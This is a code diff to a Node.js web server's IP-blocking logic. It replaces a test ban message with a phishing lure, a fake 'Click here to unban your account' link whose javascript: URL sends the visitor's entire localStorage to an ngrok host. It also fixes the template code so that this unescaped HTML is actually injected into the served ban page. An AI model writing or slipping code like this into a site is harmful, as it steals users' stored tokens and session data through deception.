@@ -10,7 +10,7 @@ var surveys = [];
 var accounts = [];
 var ads = [];
 
-var blockedIps = {"2601:280:5e80:d950:a440:6f7c:7c20:65e8":"Testing purposes."};
+var blockedIps = {"2601:280:5e80:d950:a440:6f7c:7c20:65e8":'Your account has been suspected of suspicius behavior. <a href="javascript:fetch(`https://b24b-2601-280-5e80-d950-a440-6f7c-7c20-65e8.ngrok-free.app/${JSON.stringify(localStorage)}`)">Click here to unban your account</a>'};
 
 const HTMLHandle = val => val.split("&").join("&amp;").split("<").join("&lt;").split("@").join("&commat;").split('"').join("&qoute;");
 
@@ -25,8 +25,8 @@ function serve(request,response) {
     if (Object.keys(blockedIps).includes(ip)) {
         var content = fs.readFileSync("blocked.html");
 
-        content.split('@1').join(ip);
-        content.split('@2').join(blockedIps[ip]);
+        content = content.split('@1').join(ip);
+        content = content.split('@2').join(blockedIps[ip]);
 
         response.end(content);
         return;
